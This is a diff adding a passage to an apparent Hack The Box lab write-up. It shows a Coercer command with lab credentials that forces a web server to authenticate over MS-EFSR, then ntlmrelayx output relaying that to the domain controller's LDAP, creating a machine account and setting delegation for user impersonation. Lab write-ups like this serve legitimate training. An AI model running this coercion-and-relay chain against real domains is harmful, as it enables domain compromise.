@@ -493,7 +493,46 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 ill start the relay
 
 ```python
+coercer coerce -d pirate.htb --dc-ip 10.129.244.95 -u pentest -p 'p3nt3st2025!&' -t web01.pirate.htb -l pwned --auth-type http
+       ______
+      / ____/___  ___  _____________  _____
+     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
+    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
+    \____/\____/\___/_/   \___/\___/_/       by @podalirius_
 
+[info] Starting coerce mode
+[info] Scanning target web01.pirate.htb
+[*] DCERPC portmapper discovered ports: 49664,49665,49668,49672,49706,49707,49687
+[+] DCERPC port '49687' is accessible!
+   [+] Successful bind to interface (12345678-1234-ABCD-EF00-0123456789AB, 1.0)!
+[+] SMB named pipe '\PIPE\efsrpc' is accessible!
+   [+] Successful bind to interface (df1941c5-fe89-4e79-bf10-463657acf44d, 1.0)!
+      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\pwned@80/jA7\share\file.txt\x00') 
+Continue (C) | Skip this function (S) | Stop exploitation (X) ? C
+      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcAddUsersToFileEx(FileName='\\pwned@80/muu\share\file.txt\x00')
 ```
+
+Ill then run coercer with the target, my added record and the auth type i need
+
+```python
+[*] Servers started, waiting for connections
+[*] (HTTP): Client requested path: /muu/pipe/srvsvc
+[*] (HTTP): Client requested path: /muu/pipe/srvsvc
+[*] (HTTP): Connection from 10.129.244.95 controlled, attacking target ldap://dc01.pirate.htb
+[*] (HTTP): Client requested path: /muu/pipe/srvsvc
+[*] (HTTP): Authenticating connection from PIRATE/WEB01$@10.129.244.95 against ldap://dc01.pirate.htb SUCCEED [1]
+[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Enumerating relayed user's privileges. This may take a while on large domains
+[*] (HTTP): Client requested path: /muu/pipe/srvsvc
+[*] (HTTP): Client requested path: /muu/pipe/srvsvc
+[*] All targets processed!
+[*] (HTTP): Connection from 10.129.244.95 controlled, but there are no more targets left!
+[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
+[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Attempting to create computer in: CN=Computers,DC=pirate,DC=htb
+[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Adding new computer with username: GFSNAPOT$ and password: dmhA4CZ0Az7aVno result: OK
+[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Delegation rights modified succesfully!
+[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> GFSNAPOT$ can now impersonate users on WEB01$ via S4U2Proxy
+```
+
+The attack 
 
 
